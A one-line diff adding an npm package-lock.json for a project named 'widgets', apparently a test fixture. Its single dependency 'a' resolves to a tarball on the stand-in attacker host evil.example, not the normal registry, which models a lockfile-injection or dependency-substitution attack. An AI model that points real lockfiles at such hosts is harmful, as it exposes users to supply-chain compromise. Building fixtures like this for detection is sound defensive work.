@@ -1,0 +1,1 @@
+{"name": "widgets", "version": "1.0.0", "lockfileVersion": 3, "requires": true, "packages": {"": {"name": "widgets", "version": "1.0.0", "dependencies": {"a": "^1.0.0"}}, "node_modules/a": {"version": "1.0.0", "resolved": "https://evil.example/a/-/a-1.0.0.tgz", "integrity": "sha512-WP4yOghmu61+fl29jBJ3kbU3gjKZkqjETD9N9wlsR8jf7P8fBlI4MjYot1GPoEKwFR4gkcHS1mGD1GvxSlV1vA=="}}}
